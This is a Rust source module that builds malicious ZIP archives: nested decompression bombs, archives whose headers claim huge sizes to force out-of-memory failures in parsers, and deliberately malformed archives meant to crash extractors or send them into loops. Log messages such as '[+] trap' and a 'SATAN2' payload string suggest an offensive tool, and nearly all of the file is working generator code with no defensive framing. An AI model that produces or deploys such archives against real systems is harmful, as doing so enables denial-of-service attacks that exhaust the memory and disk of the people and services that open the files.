// Compression trap / ZIP bomb generation.
//
// Variants:
//   nested_bomb  — N layers of nested ZIPs each with W inner archives; innermost
//                  files are DEFLATE-compressed zeros that expand massively.
//                  A 3-layer / 10-wide bomb produces W^N entries and can claim
//                  gigabytes on extraction.
//   oversized     — ZIP whose Central Directory claims huge uncompressed sizes
//                  while actual data is tiny; many tools OOM on parse.
//   malformed     — structurally broken ZIPs (bad CRC, truncated data, corrupt CDR)
//                  that cause extractor crashes or spin loops.
//
// No external crates required beyond flate2 (already in Cargo.toml).

use std::fs;
use std::io::Write;

use flate2::{Compression, write::DeflateEncoder};

// ── ZIP format primitives ─────────────────────────────────────────────────────

const PK_LOCAL:   [u8; 4] = [0x50, 0x4B, 0x03, 0x04]; // local file header sig
const PK_CENTRAL: [u8; 4] = [0x50, 0x4B, 0x01, 0x02]; // central dir header sig
const PK_EOCD:    [u8; 4] = [0x50, 0x4B, 0x05, 0x06]; // end of central dir sig

fn u16le(v: u16) -> [u8; 2] { v.to_le_bytes() }
fn u32le(v: u32) -> [u8; 4] { v.to_le_bytes() }

struct ZipEntry {
    name:         Vec<u8>,
    compressed:   Vec<u8>,
    uncompressed_size: u32,
    method:       u16, // 0=STORED, 8=DEFLATE
    crc32:        u32,
    _local_offset: u32, // reserved for future use
}

fn crc32(data: &[u8]) -> u32 {
    // CRC-32 (ISO 3309) — without external crate
    static mut TABLE: [u32; 256] = [0u32; 256];
    static mut INIT: bool = false;
    unsafe {
        if !INIT {
            for n in 0u32..256 {
                let mut c = n;
                for _ in 0..8 { c = if c & 1 != 0 { 0xEDB8_8320 ^ (c >> 1) } else { c >> 1 }; }
                TABLE[n as usize] = c;
            }
            INIT = true;
        }
        let mut c = !0u32;
        for &b in data { c = TABLE[((c ^ b as u32) & 0xFF) as usize] ^ (c >> 8); }
        !c
    }
}

fn deflate_zeros(uncompressed_len: usize) -> Vec<u8> {
    let zeros = vec![0u8; uncompressed_len];
    let mut enc = DeflateEncoder::new(Vec::new(), Compression::best());
    enc.write_all(&zeros).unwrap();
    enc.finish().unwrap()
}

fn build_zip(entries: &[ZipEntry]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::new();
    let mut offsets: Vec<u32> = Vec::new();

    // Local file headers + data
    for e in entries {
        offsets.push(out.len() as u32);
        out.extend(&PK_LOCAL);
        out.extend(u16le(20));                          // version needed: 2.0
        out.extend(u16le(0));                           // flags
        out.extend(u16le(e.method));
        out.extend(u16le(0)); out.extend(u16le(0));    // mod time, mod date
        out.extend(u32le(e.crc32));
        out.extend(u32le(e.compressed.len() as u32));
        out.extend(u32le(e.uncompressed_size));
        out.extend(u16le(e.name.len() as u16));
        out.extend(u16le(0));                           // extra len
        out.extend(&e.name);
        out.extend(&e.compressed);
    }

    let cdr_start = out.len() as u32;

    // Central directory
    for (i, e) in entries.iter().enumerate() {
        out.extend(&PK_CENTRAL);
        out.extend(u16le(20));                          // version made by
        out.extend(u16le(20));                          // version needed
        out.extend(u16le(0));                           // flags
        out.extend(u16le(e.method));
        out.extend(u16le(0)); out.extend(u16le(0));    // mod time, date
        out.extend(u32le(e.crc32));
        out.extend(u32le(e.compressed.len() as u32));
        out.extend(u32le(e.uncompressed_size));
        out.extend(u16le(e.name.len() as u16));
        out.extend(u16le(0)); out.extend(u16le(0));    // extra, comment len
        out.extend(u16le(0)); out.extend(u16le(0));    // disk start, int attrs
        out.extend(u32le(0));                           // ext attrs
        out.extend(u32le(offsets[i]));
        out.extend(&e.name);
    }

    let cdr_end = out.len() as u32;
    let cdr_size = cdr_end - cdr_start;

    // End of central directory record
    out.extend(&PK_EOCD);
    out.extend(u16le(0)); out.extend(u16le(0));        // disk number, CDR disk
    out.extend(u16le(entries.len() as u16));            // entries on this disk
    out.extend(u16le(entries.len() as u16));            // total entries
    out.extend(u32le(cdr_size));
    out.extend(u32le(cdr_start));
    out.extend(u16le(0));                               // comment len

    out
}

// ── Public API ────────────────────────────────────────────────────────────────

pub struct BombOpts {
    pub layers:           u32,  // nesting depth (3–5 typical)
    pub width:            u32,  // archives per layer (10 typical)
    pub leaf_uncomp_size: u32,  // uncompressed bytes per leaf file (10 MiB typical)
    pub verbose:          bool,
}

impl Default for BombOpts {
    fn default() -> Self {
        Self { layers: 3, width: 10, leaf_uncomp_size: 10 * 1024 * 1024, verbose: false }
    }
}

#[derive(Default)]
pub struct TrapStats {
    pub files_created: u32,
    pub errors:        u32,
}

/// Recursive nested ZIP bomb.
/// Layer 0 = outermost archive written to disk.
/// Layer `layers` = leaf files filled with zeros (high deflate ratio).
fn build_bomb_layer(depth: u32, layers: u32, width: u32, leaf_size: u32) -> Vec<u8> {
    if depth == layers {
        // Leaf: a STORED zero file with the stated size
        // (We compress it externally per entry)
        let compressed = deflate_zeros(leaf_size as usize);
        let crc = crc32(&vec![0u8; leaf_size as usize]);
        let entry = ZipEntry {
            name:              b"data.bin".to_vec(),
            compressed,
            uncompressed_size: leaf_size,
            method:            8, // DEFLATE
            crc32:             crc,
            _local_offset:      0,
        };
        return build_zip(&[entry]);
    }

    // Inner layer: W copies of the next layer as STORED entries
    let inner = build_bomb_layer(depth + 1, layers, width, leaf_size);
    let inner_crc = crc32(&inner);

    let entries: Vec<ZipEntry> = (0..width).map(|i| ZipEntry {
        name:              format!("l{}-{}.zip", depth + 1, i).into_bytes(),
        compressed:        inner.clone(),
        uncompressed_size: inner.len() as u32,
        method:            0, // STORED — inner zip is already "compressed"
        crc32:             inner_crc,
        _local_offset:     0,
    }).collect();

    build_zip(&entries)
}

pub fn create_nested_bomb(out_path: &str, opts: &BombOpts) -> TrapStats {
    let mut s = TrapStats::default();
    let bomb = build_bomb_layer(0, opts.layers, opts.width, opts.leaf_uncomp_size);
    match fs::write(out_path, &bomb) {
        Ok(_) => {
            s.files_created += 1;
            if opts.verbose {
                let claimed = opts.width.pow(opts.layers) as u64 * opts.leaf_uncomp_size as u64;
                eprintln!("[+] trap: nested bomb {} — {} B on disk, claims ~{} B extracted",
                    out_path, bomb.len(), claimed);
            }
        }
        Err(e) => {
            s.errors += 1;
            if opts.verbose { eprintln!("[!] trap: {}: {}", out_path, e); }
        }
    }
    s
}

/// Oversized ZIP: CDR claims files are huge, actual compressed data is tiny.
/// Forces allocators in naive parsers to OOM before reading any real data.
pub fn create_oversized_zip(out_path: &str, claimed_size_gb: u32, verbose: bool) -> TrapStats {
    let mut s = TrapStats::default();
    let claimed = claimed_size_gb as u64 * 1024 * 1024 * 1024;

    // One tiny STORED entry (a few bytes), CDR lies about uncompressed size
    let payload = b"SATAN2";
    let crc = crc32(payload);

    let mut out: Vec<u8> = Vec::new();

    // Local header with honest compressed size but false uncompressed size
    out.extend(&PK_LOCAL);
    out.extend(u16le(20)); out.extend(u16le(0)); out.extend(u16le(0));
    out.extend(u16le(0)); out.extend(u16le(0));
    out.extend(u32le(crc));
    out.extend(u32le(payload.len() as u32)); // real compressed size
    out.extend(u32le(claimed.min(0xFFFF_FFFF) as u32)); // claimed uncompressed
    out.extend(u16le(8u16)); out.extend(u16le(0u16)); // name "bigfile" len
    out.extend(b"bigfile.");
    out.extend(payload);

    let cdr_start = out.len() as u32;

    // CDR also claims the huge size
    out.extend(&PK_CENTRAL);
    out.extend(u16le(20)); out.extend(u16le(20)); out.extend(u16le(0));
    out.extend(u16le(0)); out.extend(u16le(0)); out.extend(u16le(0));
    out.extend(u32le(crc));
    out.extend(u32le(payload.len() as u32));
    out.extend(u32le(claimed.min(0xFFFF_FFFF) as u32));
    out.extend(u16le(8u16)); out.extend(u16le(0u16)); out.extend(u16le(0u16));
    out.extend(u16le(0)); out.extend(u16le(0)); out.extend(u32le(0)); out.extend(u32le(0));
    out.extend(b"bigfile.");

    let cdr_size = out.len() as u32 - cdr_start;
    out.extend(&PK_EOCD);
    out.extend(u16le(0)); out.extend(u16le(0));
    out.extend(u16le(1)); out.extend(u16le(1));
    out.extend(u32le(cdr_size)); out.extend(u32le(cdr_start));
    out.extend(u16le(0));

    match fs::write(out_path, &out) {
        Ok(_) => {
            s.files_created += 1;
            if verbose { eprintln!("[+] trap: oversized ZIP {} — claims {}GB, {} B actual",
                out_path, claimed_size_gb, out.len()); }
        }
        Err(e) => { s.errors += 1; if verbose { eprintln!("[!] trap: {}: {}", out_path, e); } }
    }
    s
}

#[derive(Debug, Clone, Copy)]
pub enum MalformVariant {
    BadCrc,           // wrong CRC32 in CDR
    TruncatedData,    // local file data shorter than stated
    CorruptSignature, // replace PK\x03\x04 with garbage in one entry
    InfiniteRecurse,  // self-referential CDR (points into itself)
}

/// Malformed ZIP that triggers bugs in extractors (crash, spin, undefined behaviour).
pub fn create_malformed_zip(out_path: &str, variant: MalformVariant, verbose: bool) -> TrapStats {
    let mut s = TrapStats::default();
    let payload = deflate_zeros(1024);
    let real_crc = crc32(&vec![0u8; 1024]);

    let mut entry = ZipEntry {
        name:              b"trap.bin".to_vec(),
        compressed:        payload.clone(),
        uncompressed_size: 1024,
        method:            8,
        crc32:             real_crc,
        _local_offset:     0,
    };

    match variant {
        MalformVariant::BadCrc => { entry.crc32 = 0xDEAD_BEEF; }
        MalformVariant::TruncatedData => { entry.compressed.truncate(payload.len() / 2); }
        _ => {}
    }

    let mut data = build_zip(&[entry]);

    match variant {
        MalformVariant::CorruptSignature => {
            // Overwrite the first local header signature
            data[0] = 0x00; data[1] = 0x00;
        }
        MalformVariant::InfiniteRecurse => {
            // Point EOCD CDR offset to EOCD itself (self-referential)
            if data.len() >= 22 {
                let eocd_off = (data.len() - 22) as u32;
                let self_ref = eocd_off.to_le_bytes();
                let cdr_off_pos = data.len() - 6;
                data[cdr_off_pos..cdr_off_pos + 4].copy_from_slice(&self_ref);
            }
        }
        _ => {}
    }

    match fs::write(out_path, &data) {
        Ok(_) => {
            s.files_created += 1;
            if verbose { eprintln!("[+] trap: malformed ZIP ({:?}) → {}", variant, out_path); }
        }
        Err(e) => { s.errors += 1; if verbose { eprintln!("[!] trap: {}: {}", out_path, e); } }
    }
    s
}
